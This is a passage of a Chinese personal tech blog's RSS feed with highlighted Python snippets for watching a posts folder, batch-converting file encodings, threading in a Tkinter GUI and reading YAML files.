            <span class="n">push</span><span class="p">(</span><span class="s2">&#34;文件修改:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">event</span><span class="o">.</span><span class="n">src_path</span><span class="p">))</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="c1"># 实例化Observer对象</span>
    <span class="n">observer</span> <span class="o">=</span> <span class="n">Observer</span><span class="p">()</span>
    <span class="n">event_handler</span> <span class="o">=</span> <span class="n">FileEventHandler</span><span class="p">()</span>
    <span class="c1"># 设置监听目录</span>
    <span class="n">dis_dir</span> <span class="o">=</span> <span class="s2">&#34;./_posts/&#34;</span>
    <span class="n">observer</span><span class="o">.</span><span class="n">schedule</span><span class="p">(</span><span class="n">event_handler</span><span class="p">,</span> <span class="n">dis_dir</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
    <span class="n">observer</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
            <span class="c1"># 设置监听频率(间隔周期时间)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="n">observer</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
    <span class="n">observer</span><span class="o">.</span><span class="n">join</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>Python批量修改文档编码</title>
    <link>https://www.bysec.cn/20170401/</link>
    <pubDate>Sat, 01 Apr 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170401/</guid>
    <description><![CDATA[<h2 id="批量修改文档编码">批量修改文档编码</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">chardet</span>


<span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">out_enc</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">content_bytes</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="n">source_encoding</span> <span class="o">=</span> <span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">content_bytes</span><span class="p">)</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;encoding&#39;</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">chardet</span><span class="o">.</span><span class="n">detect</span><span class="p">(</span><span class="n">content_bytes</span><span class="p">))</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="n">source_encoding</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">content_str</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="n">out_enc</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">content_str</span><span class="p">)</span>

        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
            <span class="n">content_bb</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

    <span class="k">except</span> <span class="ne">IOError</span> <span class="k">as</span> <span class="n">err</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;I/O error:</span><span class="si">{0}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">err</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">explore</span><span class="p">(</span><span class="nb">dir</span><span class="p">,</span> <span class="n">suffix</span><span class="p">,</span> <span class="n">out_enc</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">root</span><span class="p">,</span> <span class="n">dirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="nb">dir</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">file</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">suffix</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="n">file</span><span class="p">)</span>
                <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span>
                <span class="n">convert</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">out_enc</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">explore</span><span class="p">(</span><span class="s2">&#34;./public&#34;</span><span class="p">,</span> <span class="s2">&#34;.md&#34;</span><span class="p">,</span> <span class="s2">&#34;utf-8-sig&#34;</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>Tkinter多线程</title>
    <link>https://www.bysec.cn/20170301/</link>
    <pubDate>Wed, 01 Mar 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170301/</guid>
    <description><![CDATA[<h2 id="tkinter多线程">tkinter多线程</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="c1"># -*-coding:utf-8-*-</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">tkinter</span>
<span class="kn">import</span> <span class="nn">tkinter.messagebox</span>


<span class="k">def</span> <span class="nf">message</span><span class="p">():</span>
    <span class="n">tkinter</span><span class="o">.</span><span class="n">messagebox</span><span class="o">.</span><span class="n">showinfo</span><span class="p">(</span><span class="n">message</span><span class="o">=</span><span class="s2">&#34;弹出消息&#34;</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">sta</span><span class="p">():</span>
    <span class="n">th</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">main</span><span class="p">)</span>
    <span class="n">th</span><span class="o">.</span><span class="n">setDaemon</span><span class="p">(</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">th</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">root</span> <span class="o">=</span> <span class="n">tkinter</span><span class="o">.</span><span class="n">Tk</span><span class="p">()</span>
    <span class="n">root</span><span class="o">.</span><span class="n">title</span><span class="p">(</span><span class="s2">&#34;title&#34;</span><span class="p">)</span>
    <span class="n">root</span><span class="o">.</span><span class="n">iconbitmap</span><span class="p">(</span><span class="s2">&#34;favicon.ico&#34;</span><span class="p">)</span>
    <span class="n">root</span><span class="o">.</span><span class="n">resizable</span><span class="p">(</span><span class="n">width</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
    <span class="n">sw</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">winfo_screenwidth</span><span class="p">()</span>
    <span class="n">sh</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">winfo_screenheight</span><span class="p">()</span>
    <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">sw</span> <span class="o">-</span> <span class="mi">300</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
    <span class="n">y</span> <span class="o">=</span> <span class="p">(</span><span class="n">sh</span> <span class="o">-</span> <span class="mi">300</span><span class="p">)</span> <span class="o">/</span> <span class="mi">5</span>
    <span class="n">root</span><span class="o">.</span><span class="n">geometry</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%d</span><span class="s2">x</span><span class="si">%d</span><span class="s2">+</span><span class="si">%d</span><span class="s2">+</span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">))</span>

    <span class="n">message</span> <span class="o">=</span> <span class="n">tkinter</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s2">&#34;弹框消息&#34;</span><span class="p">,</span> <span class="n">bg</span><span class="o">=</span><span class="s1">&#39;white&#39;</span><span class="p">,</span> <span class="n">fg</span><span class="o">=</span><span class="s1">&#39;green&#39;</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="n">message</span><span class="p">)</span>
    <span class="n">message</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">message</span><span class="o">.</span><span class="n">place</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="mi">65</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="mi">150</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="mi">40</span><span class="p">)</span>

    <span class="n">sta</span> <span class="o">=</span> <span class="n">tkinter</span><span class="o">.</span><span class="n">Button</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="s2">&#34;开 始&#34;</span><span class="p">,</span> <span class="n">bg</span><span class="o">=</span><span class="s1">&#39;white&#39;</span><span class="p">,</span> <span class="n">fg</span><span class="o">=</span><span class="s1">&#39;red&#39;</span><span class="p">,</span> <span class="n">command</span><span class="o">=</span><span class="n">sta</span><span class="p">)</span>
    <span class="n">sta</span><span class="o">.</span><span class="n">pack</span><span class="p">()</span>
    <span class="n">sta</span> <span class="o">=</span> <span class="n">sta</span><span class="o">.</span><span class="n">place</span><span class="p">(</span><span class="n">x</span><span class="o">=</span><span class="mi">120</span><span class="p">,</span> <span class="n">y</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span> <span class="n">width</span><span class="o">=</span><span class="mi">60</span><span class="p">,</span> <span class="n">height</span><span class="o">=</span><span class="mi">40</span><span class="p">)</span>

    <span class="n">root</span><span class="o">.</span><span class="n">mainloop</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>python读取yaml文件</title>
    <link>https://www.bysec.cn/20170201/</link>
    <pubDate>Wed, 01 Feb 2017 00:00:00 &#43;0000</pubDate><author>
        <name>bysec</name>
    </author><guid>https://www.bysec.cn/20170201/</guid>
    <description><![CDATA[<h2 id="读取yaml文件">读取yaml文件</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="kn">import</span> <span class="nn">yaml</span>

<span class="k">def</span> <span class="nf">getYaml</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
    <span class="n">proPath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="vm">__file__</span><span class="p">))</span>
    <span class="n">yamlPath</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">proPath</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">yamlPath</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">yaml</span><span class="o">.</span><span class="n">full_load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">data</span>
</code></pre></td></tr></table>
</div>
</div>]]></description>
</item></channel>
</rss>
